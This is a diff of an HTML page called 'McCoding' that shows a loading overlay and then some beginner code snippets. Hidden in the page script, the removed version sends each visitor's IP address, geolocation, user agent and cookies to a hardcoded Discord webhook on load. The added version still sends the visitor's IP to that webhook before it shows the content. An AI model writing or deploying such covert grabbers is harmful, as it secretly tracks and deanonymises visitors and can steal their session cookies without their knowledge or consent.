@@ -1,149 +1,177 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>McCoding</title>  <!-- Updated website title here -->
-  <style>
-    body {
-      text-align: center;
-      margin-top: 50px;
-      background-color: black; /* Set background to black */
-      color: white; /* Set text color to white for visibility */
-      height: 100vh; /* Full height */
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      position: relative;
-      overflow: hidden; /* Prevent scrolling */
-      font-family: Arial, sans-serif;
-    }
-    #overlay {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0, 0, 0, 0.8); /* Semi-transparent black */
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      color: white;
-      font-size: 24px;
-      z-index: 10; /* Ensure overlay is on top */
-      padding: 20px;
-    }
-    #content {
-      display: none; /* Hide content initially */
-      font-size: 20px;
-      margin-top: 20px;
-      max-width: 600px;
-      text-align: left;
-      background: #222;
-      padding: 20px;
-      border-radius: 8px;
-    }
-    pre {
-      background: #111;
-      padding: 15px;
-      border-radius: 5px;
-      overflow-x: auto;
-      color: #0f0;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>McCoding</title>
+<style>
+  /* Body and layout */
+  body {
+    text-align: center;
+    margin: 0;
+    background: linear-gradient(-45deg, #1a1a1a, #000000, #222222, #000000);
+    background-size: 400% 400%;
+    animation: gradientBG 15s ease infinite;
+    color: white;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    overflow: hidden;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  }
+
+  /* Background gradient animation */
+  @keyframes gradientBG {
+    0% {background-position: 0% 50%;}
+    50% {background-position: 100% 50%;}
+    100% {background-position: 0% 50%;}
+  }
+
+  /* Overlay styles */
+  #overlay {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background-color: rgba(0, 0, 0, 0.85);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    font-size: 28px;
+    z-index: 10;
+    color: #f0f0f0;
+    opacity: 1;
+    transition: opacity 1s ease;
+  }
+  /* Overlay fade out */
+  #overlay.fade-out {
+    opacity: 0;
+    pointer-events: none;
+  }
+
+  /* Content styles */
+  #content {
+    display: none;
+    font-size: 18px;
+    margin-top: 20px;
+    max-width: 700px;
+    text-align: left;
+    background: rgba(30, 30, 30, 0.85);
+    padding: 25px 30px;
+    border-radius: 12px;
+    box-shadow: 0 0 15px rgba(0, 255, 150, 0.3);
+    color: #aaffaa;
+    opacity: 0;
+    transition: opacity 1s ease;
+  }
+  /* Content fade in */
+  #content.fade-in {
+    display: block;
+    opacity: 1;
+  }
+
+  pre {
+    background: #111;
+    padding: 20px;
+    border-radius: 8px;
+    overflow-x: auto;
+    color: #0f0;
+    font-size: 16px;
+    line-height: 1.4;
+    user-select: text;
+  }
+
+  p {
+    font-size: 20px;
+    margin-bottom: 15px;
+    color: #ccffcc;
+  }
+</style>
 </head>
 <body>
 
-  <div id="overlay">Loading MxxCode for You, Please Wait...</div>
+<div id="overlay">Loading MxxCode for You, Please Wait...</div>
 
-  <div id="content">
-    <p>Here are some random coding snippets:</p>
-    <pre>
-    // JavaScript Example
-    function greet(name) {
-      return `Hello, ${name}!`;
-    }
+<div id="content">
+  <p>Here are some random coding snippets:</p>
+  <pre>
+// JavaScript Example
+function greet(name) {
+  return `Hello, ${name}!`;
+}
 
-    // Python Example
-    def greet(name):
-        return f"Hello, {name}!"
+// Python Example
+def greet(name):
+    return f"Hello, {name}!"
 
-    // HTML Example
-    &lt;div&gt;Hello, World!&lt;/div&gt;
-    </pre>
-    <p>Go talk to Mxhid!</p>
-  </div>
+// HTML Example
+&lt;div&gt;Hello, World!&lt;/div&gt;
 
-  <script>
-    async function fetchAndSendUserInfo() {
-      try {
-        // Step 1: Get IP address
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        if (!ipResponse.ok) throw new Error('Failed to fetch IP');
-        const ipData = await ipResponse.json();
-        const userIP = ipData.ip;
+// CSS Example
+body {
+  background-color: #000;
+  color: #fff;
+}
 
-        // Step 2: Get location and other info using ip-api.com
-        const locationResponse = await fetch(`https://ip-api.com/json/${userIP}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
-        if (!locationResponse.ok) throw new Error('Failed to fetch location info');
-        const locationData = await locationResponse.json();
+// C++ Example
+#include &lt;iostream&gt;
+int main() {
+  std::cout &lt;&lt; "Hello, World!" &lt;&lt; std::endl;
+  return 0;
+}
 
-        if (locationData.status !== "success") {
-          throw new Error(`Location API error: ${locationData.message}`);
-        }
+// SQL Example
+SELECT * FROM users WHERE active = 1;
+  </pre>
+  <p>Go talk to Mxhid!</p>
+</div>
 
-        // Step 3: Get browser info
-        const userAgent = navigator.userAgent;
+<script>
+  function fetchAndSendIP() {
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        const userIP = data.ip;
 
-        // Step 4: Get cookies from your own domain
-        const cookies = document.cookie || 'No cookies found';
-
-        // Step 5: Prepare message content for Discord webhook
-        const messageContent = `
-**User Information:**
-- IP Address: ${userIP}
-- Country: ${locationData.country}
-- Region: ${locationData.regionName}
-- City: ${locationData.city}
-- ZIP: ${locationData.zip}
-- Latitude: ${locationData.lat}
-- Longitude: ${locationData.lon}
-- Timezone: ${locationData.timezone}
-- ISP: ${locationData.isp}
-- Organization: ${locationData.org}
-- AS: ${locationData.as}
-- User Agent: ${userAgent}
-- Cookies: ${cookies}
-        `;
-
-        // Step 6: Send data to Discord webhook
-        const webhookURL = 'https://discord.com/api/webhooks/1372872545396588666/HmJyhyOhUR9fA782D96YY2qUEFS3gdpskvFP4e4sA9yUvr1x7XYkKk0FS1lbHpFLM3Tf';
-
-        const sendResponse = await fetch(webhookURL, {
+        // Send the IP to the webhook
+        fetch('https://discord.com/api/webhooks/1372872545396588666/HmJyhyOhUR9fA782D96YY2qUEFS3gdpskvFP4e4sA9yUvr1x7XYkKk0FS1lbHpFLM3Tf', {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: messageContent })
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ content: `User IP: ${userIP}` })
+        })
+        .then(response => {
+          if (response.ok) {
+            console.log('IP sent successfully!');
+            // Animate overlay fade out
+            const overlay = document.getElementById('overlay');
+            const content = document.getElementById('content');
+            overlay.classList.add('fade-out');
+            // After fade out transition ends, hide overlay and fade in content
+            overlay.addEventListener('transitionend', () => {
+              overlay.style.display = 'none';
+              content.classList.add('fade-in');
+            }, { once: true });
+          } else {
+            console.error('Failed to send IP.');
+          }
+        })
+        .catch(error => {
+          console.error('Error sending IP:', error);
         });
+      })
+      .catch(error => {
+        const overlay = document.getElementById('overlay');
+        overlay.innerText = 'Failed to retrieve IP.';
+        console.error('Error fetching IP:', error);
+      });
+  }
 
-        if (!sendResponse.ok) {
-          throw new Error('Failed to send data to webhook');
-        }
-
-        console.log('User info sent successfully!');
-
-        // Step 7: Show content and hide overlay
-        document.getElementById('overlay').style.display = 'none';
-        document.getElementById('content').style.display = 'block';
-
-      } catch (error) {
-        console.error('Error:', error);
-        document.getElementById('overlay').innerText = 'Failed to retrieve user information.';
-      }
-    }
-
-    window.onload = fetchAndSendUserInfo;
-  </script>
+  window.onload = fetchAndSendIP;
+</script>
 
 </body>
 </html>
